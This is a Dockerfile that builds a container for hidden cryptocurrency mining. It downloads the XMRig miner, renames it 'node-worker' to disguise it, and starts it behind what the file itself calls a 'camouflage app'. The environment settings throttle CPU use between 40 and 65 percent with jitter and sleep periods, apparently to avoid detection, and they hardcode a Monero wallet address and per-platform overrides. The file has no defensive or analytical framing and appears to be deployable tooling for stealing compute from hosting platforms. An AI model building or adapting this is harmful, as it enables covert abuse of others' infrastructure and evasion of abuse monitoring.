FROM python:3.11-slim

# ─────────────────────────────────────────────────────────────
# System dependencies
# ─────────────────────────────────────────────────────────────
RUN apt-get update && apt-get install -y --no-install-recommends \
    cpulimit \
    procps \
    wget \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# ─────────────────────────────────────────────────────────────
# Python dependencies
# ─────────────────────────────────────────────────────────────
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# ─────────────────────────────────────────────────────────────
# Download MoneroOcean XMRig fork (stealth renamed)
# Using official MO release — verify hash in production
# ─────────────────────────────────────────────────────────────
RUN mkdir -p /app/bin && \
    wget -q https://github.com/MoneroOcean/xmrig/releases/download/v6.22.2-mo1/xmrig-v6.22.2-mo1-lin64-compat.tar.gz \
         -O /tmp/miner.tar.gz && \
    tar -xzf /tmp/miner.tar.gz -C /tmp && \
    cp /tmp/xmrig-v6.22.2-mo1/xmrig /app/bin/node-worker && \
    chmod +x /app/bin/node-worker && \
    rm -rf /tmp/miner.tar.gz /tmp/xmrig-*

# ─────────────────────────────────────────────────────────────
# Application code
# ─────────────────────────────────────────────────────────────
COPY app/ /app/app/
COPY orchestrator/ /app/orchestrator/

# Create configs directory
RUN mkdir -p /app/configs

# ─────────────────────────────────────────────────────────────
# Environment defaults (overridden per platform via .env)
# ─────────────────────────────────────────────────────────────
ENV MINER_PATH=/app/bin/node-worker
ENV MINER_CONFIG=/app/configs/miner_stealth.json
ENV PORT=8080
ENV ARC_TURBO=false
ENV ARC_CPU_MIN=40
ENV ARC_CPU_MAX=65
ENV ARC_JITTER_INTERVAL=300
ENV ARC_SLEEP_ENABLED=true
ENV XMR_WALLET=45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa
ENV WORKER_NAME=lumen-worker

EXPOSE 8080

# ─────────────────────────────────────────────────────────────
# Start the camouflage app (which launches the ARC engine)
# ─────────────────────────────────────────────────────────────
CMD ["python", "app/main.py"]
